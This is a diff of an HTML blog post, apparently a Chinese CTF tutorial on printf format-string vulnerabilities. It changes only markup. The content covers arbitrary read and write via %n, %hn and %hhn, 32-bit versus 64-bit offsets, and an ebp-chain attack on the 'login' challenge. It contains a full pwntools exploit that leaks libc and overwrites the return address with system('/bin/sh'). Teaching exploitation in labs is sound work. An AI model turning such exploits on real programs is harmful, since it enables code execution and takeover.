@@ -129,27 +129,27 @@
 
       <div class="article-entry">
         <p>最近比赛有太多的格式化字符串漏洞，今天就来总结一下常见的格式化字符串。由易到难的讲解格式化字符串的利用和最近遇到格式化字符串的考点。</p>
-<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>格式化字符串一般都是程序员为了偷懒而导致的漏洞。为了输出字符串，而直接使用printf(&amp;buf)来打印字符串。今天我们从原理上来讲解这样写为什么会产生漏洞。</p>
+<h2><span id="漏洞原理分析">漏洞原理分析</span></h2><p>格式化字符串一般都是程序员为了偷懒而导致的漏洞。为了输出字符串，而直接使用printf(&amp;buf)来打印字符串。今天我们从原理上来讲解这样写为什么会产生漏洞。</p>
 <p>正常的使用printf(“%s”,&amp;buf);来打印字符串</p>
 <p>当call printf的时候栈上的结构为：</p>
-<p><img src="./1.png" alt=""></p>
+<p><img src="./1.png" alt></p>
 <p>这样函数就打印出第二个参数的地址上的字符串,这样就能正常打印出‘aaaa’。printf函数识别出‘%s’是一个格式化字符串，然后根据这个格式化字符串去取参数，’%s‘默认取第二个参数为作为字符串输出地址也就是‘%s’的下面一个栈空间，这样就能打印出‘aaaa’。</p>
 <p>如果我们程序员偷懒，不使用格式化字符串，那么我们还是能打印出来。</p>
-<p><img src="./2.png" alt=""></p>
+<p><img src="./2.png" alt></p>
 <p>因为printf没有解析到格式化字符串，直接将‘aaaa’作为格式化字符串输出了。这原理就像是我们平时用printf(“hello world !!”);这个道理是一样的。但是这个时候和printf(“hello world !!”);不一样的是，字符串是我们能控制的，这个时候漏洞就出现了。</p>
-<h2 id="32位格式化字符串利用"><a href="#32位格式化字符串利用" class="headerlink" title="32位格式化字符串利用"></a>32位格式化字符串利用</h2><p>如果我任意构造一个格式化字符串，printf就会去解析，然后就根据解析的内容，去栈上都读偏移，然后执行相应的功能。</p>
+<h2><span id="32位格式化字符串利用">32位格式化字符串利用</span></h2><p>如果我任意构造一个格式化字符串，printf就会去解析，然后就根据解析的内容，去栈上都读偏移，然后执行相应的功能。</p>
 <p>例如，我们输入一个‘%s’的格式化字符串，我们来分析他的原理。</p>
-<p><img src="./3.png" alt=""></p>
+<p><img src="./3.png" alt></p>
 <p>同理，printf解析出‘%s’了，相应的他要读出printf的第二个参数上的值。可是我们又没有给第二个参数，但是在程序里面，确认参数是不看你有没有输入，而是看栈的偏移。对于printf来说，第一个参数是栈顶，第二个参数是当前的[esp+4],第三个参数是[esp+8],依次类推。这里也就是输出‘&amp;buf’栈空间下面那个地址上的值。但是这个地方不确定是不是地址，所以程序可能打印失败。</p>
 <p>但是格式化字符串给了一个我们可以自动定位的一个格式化字符串‘%n$’的参数。也就是在这里可以自己定位栈空间。</p>
 <p>如果我们在这个给的是这‘%4$s’+p32(&amp;’hello world’)</p>
-<p><img src="./4.png" alt=""></p>
+<p><img src="./4.png" alt></p>
 <p>所以这个时候打印出来的就是’hello world’了。这个printf解析出有格式化串‘%4$s‘，也就是将buf栈下第4个栈空间的地址上的值当作字符串打印出来。注意这个p32(&amp;”hello world”)在这里只是做举例用，这个值我们可以写做任意一个值，也就是说我们能泄露任意地址上的值。这就达到了任意地址泄露。</p>
 <p>当然达到任意地址泄露往往只是成功了一半，我们还需要达到任意地址写。</p>
 <p>这个时候printf又提供了一个参数’%n‘,这个参数是将前面打印出来的字符数量写入到第二个参数的所指向的地址上的值。这个时候配合’%c‘可以写任意的值。当然这个’%n‘也可以结合’n$‘来使用，可以定位在栈上偏移。</p>
 <p>例如，我们想在0x80000000(只是举例，不保证地址的合法性)上面写一个0x66666666</p>
 <p>我们应该这样构造出这样的栈</p>
-<p><img src="./5.png" alt=""></p>
+<p><img src="./5.png" alt></p>
 <p>payload应该是这样%1717986918c%7$n+p32(0x80000000),这样就可以在0x80000000上面写0x66666666。</p>
 <p>但是一般这样写有个问题，靠%1717986918c打印出0x66666666需要很长时间，一般程序会死掉，所以不能直接这么写。但是printf还提供了一个%n同类的格式化字符串</p>
 <p>%n        一次性写入四个字节</p>
@@ -158,18 +158,18 @@
 <p>然后我们可以这样构造</p>
 <p>%26214c%8$hn%9$hnaaa+p32(0x80000000)+p32(0x80000002)</p>
 <p>注意，构造的时候，在格式化的串直接不有’\x00‘字符串截断，不然printf不能解析格式化字符串了。</p>
-<p><img src="./6.png" alt=""></p>
+<p><img src="./6.png" alt></p>
 <p>这样就可以任意地址写了。</p>
 <p>一般来说，格式化字符串就是通过任意地址读写，来泄露got和修改got表来达到劫持程序流程。</p>
 <p>pwntools整合了32位格式化字符串的利用。</p>
 <p>fmtstr_payload(offset,{target_addr:value},write_size=’short’)自动就生成了payload,但是我不建议新手直接使用这个函数。</p>
 <p>原理讲解到这里了，来个例子：</p>
-<p>题目链接：<a href=""></a></p>
-<h2 id="64位格式化字符串利用"><a href="#64位格式化字符串利用" class="headerlink" title="64位格式化字符串利用"></a>64位格式化字符串利用</h2><p>64位的和32位的利用方式其实是差不多的，唯一的差别就是64位的传参方式不一样，所以偏移量不一样。64位传参方式是rdi,rsi,rdx,rcx,r8,r9。第一个参数已经被我们格式化字符串占用了，所以第%1$p是rsi的值，然后往后顺延，直到%6$p是栈上第一个数据，然后后面和32位差不多了。</p>
+<p>题目链接：<a href></a></p>
+<h2><span id="64位格式化字符串利用">64位格式化字符串利用</span></h2><p>64位的和32位的利用方式其实是差不多的，唯一的差别就是64位的传参方式不一样，所以偏移量不一样。64位传参方式是rdi,rsi,rdx,rcx,r8,r9。第一个参数已经被我们格式化字符串占用了，所以第%1$p是rsi的值，然后往后顺延，直到%6$p是栈上第一个数据，然后后面和32位差不多了。</p>
 <p>但是64位和32位还有一点不同的是，32位的地址一般能沾满整个栈单元，没有’\x00’字符，所以就不会无论地址写在格式化字符串前或者后面，都不会会造成格式化字符串的截断，但是64位不同，64位的地址一般不会沾满整个栈单元，一般只使用六个字节。所以会有’\x00’截断，如果把地址写在格式化字符串的前面，那么就会产生’\x00’截断，导致后面格式化字符串被截断不执行。</p>
 <p>好了  这里也举个例子说一下吧。</p>
 <p>题目链接</p>
-<h2 id="Ebp-chain修改任意地址"><a href="#Ebp-chain修改任意地址" class="headerlink" title="Ebp chain修改任意地址"></a>Ebp chain修改任意地址</h2><p>Ebp chain是格式化字符串比较高级的利用方式，前两种利用方式是我们输入的值直接在栈上，但是如果我们输入的值全在bss段上，那么我们怎么做到修改格式化字符串呢？</p>
+<h2><span id="ebp-chain修改任意地址">Ebp chain修改任意地址</span></h2><p>Ebp chain是格式化字符串比较高级的利用方式，前两种利用方式是我们输入的值直接在栈上，但是如果我们输入的值全在bss段上，那么我们怎么做到修改格式化字符串呢？</p>
 <p>通过上面的知识我们得知，想要修改或者读一个地址的值，那么这个地址就得在栈上。所以我们要想办法把这个地址写到栈上。这个说起来有点抽象，还是举个例子吧。</p>
 <p>这是swupctf的一道题。</p>
 <p>题目链接：<a href="login">login</a></p>
@@ -177,7 +177,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804854B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your password: "</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s1[<span class="built_in">read</span>(<span class="number">0</span>, s1, <span class="number">0x32</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">"wllmmllw"</span>, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This is the wrong password: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s1);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Login successfully! Have fun!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们发现这是个无次数限制的格式化字符串利用。但是这里往bss段上写，不能像上面那样利用。这个时候我们看一下我们利用的时候，栈上的数据</p>
-<p><img src="./7.png" alt=""></p>
+<p><img src="./7.png" alt></p>
 <p>我们能看到栈上ebp的指针指向上一个ebp。上一个ebp指向上上个ebp。我们前面是不是说过只要有地址，我们就能往这个地址上写任意的值。</p>
 <p>这个时候我们可以这样利用。这里我们为了叙述，我们把当前ebp叫ebp1,我们上一个ebp叫ebp2,我们把上上个ebp叫做ebp3。</p>
 <p>这个时候我们需要转换思维，既然这个有值是栈地址，我们就不需要去修改got表再劫持程序了，我们直接修改老eip。</p>
@@ -185,7 +185,7 @@
 <p>我的脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">"./login"</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">"./login"</span>)</span><br><span class="line">bss=<span class="number">0x804B0A0</span>+<span class="number">0xc</span>+<span class="number">0x10</span></span><br><span class="line">p.sendlineafter(<span class="string">"Please input your name: "</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%6$p'</span></span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Please input your password: "</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">stack_addr=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> hex(stack_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%15$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">libc_start_main=int(p.recv(<span class="number">8</span>),<span class="number">16</span>)<span class="number">-247</span></span><br><span class="line">libc=LibcSearcher(<span class="string">"__libc_start_main"</span>,libc_start_main)</span><br><span class="line">system=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"system"</span>)</span><br><span class="line">str_bin_sh=libc_start_main-libc.dump(<span class="string">"__libc_start_main"</span>)+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0xc</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((system&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&amp;<span class="number">0xffff</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-0x4</span>+<span class="number">2</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">payload=<span class="string">'%'</span>+str((str_bin_sh&gt;&gt;<span class="number">16</span>))+<span class="string">'c%10$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">gdb.attach(p,<span class="string">''' b *0x080485AF '''</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%'</span>+str((stack_addr&amp;<span class="number">0xff</span>)<span class="number">-8</span>)+<span class="string">'c%6$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"Try again!\n"</span>,payload)</span><br><span class="line">p.sendafter(<span class="string">"Try again!\n"</span>,<span class="string">"wllmmllw"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
+<h2><span id="总结">总结</span></h2>
       </div>
 
       <div class="article-footer">
